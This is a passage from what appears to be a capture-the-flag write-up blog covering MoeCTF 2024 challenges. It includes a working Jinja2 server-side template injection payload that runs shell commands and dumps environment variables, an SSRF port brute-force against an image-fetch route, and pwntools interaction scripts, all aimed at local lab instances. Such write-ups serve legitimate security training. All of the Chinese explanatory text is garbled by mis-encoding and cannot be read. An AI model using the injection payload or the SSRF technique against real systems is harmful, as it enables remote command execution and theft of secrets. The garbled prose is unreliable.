</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;player&#34;</span>: <span style="color:#e6db74">&#34;w8nn9z&#34;</span>, <span style="color:#e6db74">&#34;direct&#34;</span>: req})
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:1433/&#34;</span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> sol(res)
</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>è¾“å‡ºç»“æœï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;å¬å£°è¾©ä½&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/style.css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;å¬å£°è¾©ä½&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;é—¯å…³å¼Ÿå­æ³¨æ„ï¼Œæœ¬å…³ç»§ç»­è€ƒéªŒä½ å¬å£°è¾©ä½çš„åŠŸå¤«&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;ä½ å¯å®šåä¸­å¤®ï¼Œå…ˆåå°†æœ‰äº”æ³¢æ•°å­—æŠ›å‡ºï¼Œä½ éœ€è¦åœ¨3ç§’å†…æŒ‰è¦æ±‚è¯´å‡ºæ–¹ä½&lt;/<span style="color:#f92672">p</span>&gt;        
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;ç¤ºä¾‹ï¼š1 -&gt; åŒ—æ–¹&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;2,3 -&gt; ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;è¾“å…¥é€‰æ‰‹åå­—å’Œ &#34;å¼Ÿå­æ˜ç™½&#34; å¼€å§‹æ¸¸æˆ&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;parent&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/images/test.png&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imgs&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/restart&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;div_restart&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;restart&#34;</span>&gt;æŒ‰ä¸‹æŒ‰é’®é‡æ–°å¼€å§‹ï¼š&lt;/<span style="color:#f92672">label</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;restart&#34;</span>&gt;å¼€å§‹&lt;/<span style="color:#f92672">button</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;player&#34;</span>&gt;è¯·è¾“å…¥é€‰æ‰‹åå­—ï¼š&lt;/<span style="color:#f92672">label</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;player&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;player&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;direct&#34;</span>&gt;è¯·å›ç­”é—®é¢˜ï¼š&lt;/<span style="color:#f92672">label</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;direct&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;direct&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;say&#34;</span>&gt;æŒ‰ä¸‹æŒ‰é’®å›ç­”ï¼š&lt;/<span style="color:#f92672">label</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;say&#34;</span>&gt;å›ç­”&lt;/<span style="color:#f92672">button</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;status&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color:green;&#34;</span>&gt;ä½ è¿‡å…³ï¼ï¼ˆè¿‡å…³çš„å°æ›²ï¼‰&lt;<span style="color:#f92672">br</span>&gt;moectf{w3LllI_YoU-PA55_The_cHal1eNGe-frrRrRom_tOnRen8}&lt;/<span style="color:#f92672">span</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><hr>
<h2 id="whos-blog">who&rsquo;s blog?<a hidden class="anchor" aria-hidden="true" href="#whos-blog">#</a></h2>
<p>ç½‘ç«™æœ‰è¿™æ ·ä¸€å¥è¯ï¼Œæç¤ºä¼ å‚idï¼š</p>
<pre tabindex="0"><code>è¿™é‡Œæ›¾ç»æ˜¯ Sxrhhh çš„ä¸ªäººå°ç«™ã€‚ä½†æ˜¯è¿«äºå‹åŠ›ï¼ŒSxrhhh åªèƒ½æ‹å–è‡ªå·±çš„ç½‘ç«™äº†ã€‚æä¾›ä½ çš„ id æ¥é¢†å…»è¿™ä¸ªå¯æ€œçš„ç½‘ç«™å§
</code></pre><p>å°è¯•åå¯ä»¥å‘ç°æ˜¯sstiï¼Œå¹¶ä¸”å¦‚æœæŠ¥é”™å¯ä»¥å‘ç°æ˜¯Jinjia2çš„æ¨¡æ¿ï¼Œä¹‹åå°±æ˜¯å¸¸è§„æ³¨å…¥ï¼š</p>
<pre tabindex="0"><code class="language-payload" data-lang="payload">http://127.0.0.1:32683/?id={{().__class__.__base__.__subclasses__()[239].__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;env&#39;).read()&#34;&#34;)}}
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-env" data-lang="env"><span style="display:flex;"><span>KUBERNETES_SERVICE_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> KUBERNETES_PORT<span style="color:#f92672">=</span>tcp://10.43.0.1:443 HOSTNAME<span style="color:#f92672">=</span>ret2shell-40-7062 PYTHON_PIP_VERSION<span style="color:#f92672">=</span>23.0.1 SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> HOME<span style="color:#f92672">=</span>/root GPG_KEY<span style="color:#f92672">=</span>A035C8C19219BA821ECEA86B64E628F8D684696D WERKZEUG_SERVER_FD<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> PYTHON_GET_PIP_URL<span style="color:#f92672">=</span>https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py WERKZEUG_RUN_MAIN<span style="color:#f92672">=</span>true KUBERNETES_PORT_443_TCP_ADDR<span style="color:#f92672">=</span>10.43.0.1 PATH<span style="color:#f92672">=</span>/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> KUBERNETES_PORT_443_TCP_PROTO<span style="color:#f92672">=</span>tcp LANG<span style="color:#f92672">=</span>C.UTF-8 PYTHON_VERSION<span style="color:#f92672">=</span>3.10.14 PYTHON_SETUPTOOLS_VERSION<span style="color:#f92672">=</span>65.5.1 KUBERNETES_SERVICE_PORT_HTTPS<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> KUBERNETES_PORT_443_TCP<span style="color:#f92672">=</span>tcp://10.43.0.1:443 KUBERNETES_SERVICE_HOST<span style="color:#f92672">=</span>10.43.0.1 PWD<span style="color:#f92672">=</span>/app PYTHON_GET_PIP_SHA256<span style="color:#f92672">=</span>6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118 FLAG<span style="color:#f92672">=</span>moectf<span style="color:#f92672">{</span>d0-y0u-kNOw-SST1-4Nd_pl3A5e-V151t_5XRHHhS-BL0g2<span style="color:#f92672">}</span> 
</span></span></code></pre></div><hr>
<h2 id="imagecloud">ImageCloud<a hidden class="anchor" aria-hidden="true" href="#imagecloud">#</a></h2>
<p>é™„ä»¶ç»™äº†ä¸¤ä¸ªflaskæœåŠ¡çš„æºç ï¼Œ<code>app.py</code> éƒ¨ç½²åœ¨5000çš„ç«¯å£ä¸Šï¼Œè€Œ <code>app2.py</code> éƒ¨ç½²åœ¨5001~5999çš„ç«¯å£ä¸Šï¼ŒåŒæ—¶åœ¨ <code>uploads</code> ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°æœ‰æŸåçš„ <code>flag.jpg</code> ï¼Œæç¤ºäº†flagå›¾ç‰‡çš„ä½ç½®</p>
<p>å…ˆåˆ†æ <code>app.py</code> ï¼Œå®ç°äº†ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ çš„åŠŸèƒ½ï¼Œ<code>UPLOAD_FOLDER = 'static/'</code> ï¼Œä¸”é™åˆ¶äº†å¸¸è§çš„å›¾ç‰‡åç¼€ï¼ŒåŒæ—¶ <code>/image</code> è·¯ç”±ç”¨æ¥è·å–å›¾ç‰‡ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/image&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_image</span>():
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;url&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;URL å‚æ•°ç¼ºå¤±&#39;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>        img <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(BytesIO(response<span style="color:#f92672">.</span>content))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        img_io <span style="color:#f92672">=</span> BytesIO()
</span></span><span style="display:flex;"><span>        img<span style="color:#f92672">.</span>save(img_io, img<span style="color:#f92672">.</span>format)
</span></span><span style="display:flex;"><span>        img_io<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> send_file(img_io, mimetype<span style="color:#f92672">=</span>img<span style="color:#f92672">.</span>get_format_mimetype())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;æ— æ³•åŠ è½½å›¾ç‰‡: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">400</span>
</span></span></code></pre></div><p>å†åˆ†æ <code>app2.py</code> ï¼ŒåŒæ ·æœ‰å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡ <code>UPLOAD_FOLDER = 'uploads/'</code>ï¼Œä¹Ÿå­˜åœ¨è·å–å›¾ç‰‡çš„è·¯ç”±ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/image/&lt;filename&gt;&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_image</span>(filename):
</span></span><span style="display:flex;"><span>    filepath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>], filename)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(filepath):
</span></span><span style="display:flex;"><span>        mime <span style="color:#f92672">=</span> get_mimetype(filepath)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> send_file(filepath, mimetype<span style="color:#f92672">=</span>mime)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;æ–‡ä»¶æœªæ‰¾åˆ°&#39;</span>, <span style="color:#ae81ff">404</span>
</span></span></code></pre></div><p>è¿™æ ·è‡ªç„¶èƒ½æƒ³åˆ°é€šè¿‡å¤–éƒ¨å›¾ç‰‡äº‘çš„ <code>/image</code> è·¯ç”±å»è®¿é—®å†…éƒ¨å›¾ç‰‡äº‘çš„flagå›¾ç‰‡ï¼Œåªè¦å†çˆ†ç ´ä¸€ä¸‹ <code>app2.py</code> çš„ç«¯å£å³å¯ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/WEB/4.png"></p>
<p>æ‹¿åˆ°flagå›¾ç‰‡ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/WEB/5.jpg"></p>
<hr>
<h2 id="äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—">äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—<a hidden class="anchor" aria-hidden="true" href="#äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—">#</a></h2>
<p>ç›´æ¥ncæ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦ç”¨pwntoolsè¿›è¡Œäº¤äº’</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">52609</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>è¿è¡Œç»“æœ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Hey, how did you get here?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I<span style="color:#e6db74">&#39;ve been waiting so long, for anyone...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To honor your courage, I decided to give you a flag.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">But next time, it won&#39;</span>t be so easy.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>Welcome_to_the_journey_of_Pwn<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Good luck.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>By the way, netcat is not a cat!
</span></span></code></pre></div><hr>
<h2 id="flag_helper">flag_helper<a hidden class="anchor" aria-hidden="true" href="#flag_helper">#</a></h2>
<p>ncè¿ä¸Šä»¥åå…ˆæ˜¯4ä¸ªé€‰æ‹©ï¼Œéƒ½å°è¯•äº†ä¸€éåå‘ç°åªæœ‰4æ‰èƒ½è¯»å–æ–‡ä»¶å†…å®¹è¿›è€Œè¯»å–/flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Welcome to MoeCTF <span style="color:#ae81ff">2024</span> <span style="color:#e6db74">&#34;Pwn&#34;</span>.
</span></span><span style="display:flex;"><span>Have trouble with flag?
</span></span><span style="display:flex;"><span>What can I <span style="color:#66d9ef">do</span> <span style="color:#66d9ef">for</span> you?
</span></span><span style="display:flex;"><span>1. <span style="color:#e6db74">&#34;Capture the flag.&#34;</span>
</span></span><span style="display:flex;"><span>2. <span style="color:#e6db74">&#34;Goodbye.&#34;</span>
</span></span><span style="display:flex;"><span>3. <span style="color:#e6db74">&#34;V me 50 pts.&#34;</span>
</span></span><span style="display:flex;"><span>4. <span style="color:#e6db74">&#34;Play game with me.&#34;</span>
</span></span><span style="display:flex;"><span>Make your choice.
</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>OK. Tell me a file path. I can <span style="color:#e6db74">`</span>read<span style="color:#e6db74">`</span> what others cannot <span style="color:#e6db74">`</span>read<span style="color:#e6db74">`</span>.
</span></span><span style="display:flex;"><span>&gt; /flag
</span></span></code></pre></div><p>åè¦æ±‚è¾“å…¥opençš„&rsquo;flags&rsquo;å‚æ•°ï¼Œè¾“å…¥0å‘ç°èƒ½æ‰“å¼€/flagæ–‡ä»¶</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Now, give me <span style="color:#e6db74">`</span>flags<span style="color:#e6db74">`</span> <span style="color:#66d9ef">for</span> this to-be-opened file.
</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Opened file /dev/random.
</span></span><span style="display:flex;"><span>Opened file /dev/urandom.
</span></span><span style="display:flex;"><span>Opened file /flag.
</span></span><span style="display:flex;"><span>Opened file /dev/zero.
</span></span></code></pre></div><p>åè¦æ±‚è¾“å…¥mmapçš„&rsquo;prot&rsquo;å‚æ•°å’Œ&rsquo;flags&rsquo;å‚æ•°ï¼Œæœ¬æ¥ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œåæ¥åœ¨åšä¸€é“ORWé¢˜ç›®æ—¶çœ‹åˆ°äº†å…³äºmmapçš„å†…å®¹ï¼ˆ</p>
<p><img loading="lazy" src="/images/MoeCTF2024/PWN/1.png"></p>
<p>äºæ˜¯çŸ¥é“protå‚æ•°ä¸º7ï¼Œflagså‚æ•°ä¸º0x22å³34</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Then we have to <span style="color:#e6db74">`</span>mmap<span style="color:#e6db74">`</span> a place <span style="color:#66d9ef">for</span> the content... How <span style="color:#66d9ef">do</span> we <span style="color:#e6db74">`</span>prot<span style="color:#e6db74">`</span> it?
</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>And, <span style="color:#e6db74">`</span>flags<span style="color:#e6db74">`</span>. <span style="color:#f92672">(</span>Calm down, your flag is on the way.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">34</span>
</span></span><span style="display:flex;"><span>Coming in three!
</span></span><span style="display:flex;"><span>Two...
</span></span><span style="display:flex;"><span>Oonnne...
</span></span></code></pre></div><p>æœ€ååªè¦è¾“å…¥/flagå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯ï¼Œfdä»0å¼€å§‹åˆ†åˆ«å¯¹åº”äº†æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯ï¼Œä»¥åŠæ‰“å¼€çš„æ–‡ä»¶/dev/randomï¼Œ/dev/unrandomï¼Œ/flagï¼Œ/dev/zeroï¼Œæ‰€ä»¥/flagå¯¹åº”çš„fdä¸º5</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>... I forgot the <span style="color:#e6db74">`</span>fd<span style="color:#e6db74">`</span> to read from. Do you still remember?
</span></span><span style="display:flex;"><span>&gt; <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>Oh, yes yeah, 5.
</span></span><span style="display:flex;"><span>Finally, here you are.
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>f1IE-de5CR1PTOr-IS-PrEDlcT@bIe46361a<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="notenoughtime">NotEnoughTime<a hidden class="anchor" aria-hidden="true" href="#notenoughtime">#</a></h2>
<p>å£ç®—é¢˜å¡å±äºæ˜¯ï¼Œåªéœ€æ³¨æ„åœ°æ¿é™¤ä»¥åŠå»æ‰é¢˜ç›®çš„\nå³å¯ï¼Œè¿›è¡Œå¤šæ¬¡äº¤äº’å¾—flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">53597</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Let&#39;s begin with simple ones.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;OK, then some tough ones. Be WELL PREPARED!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>):
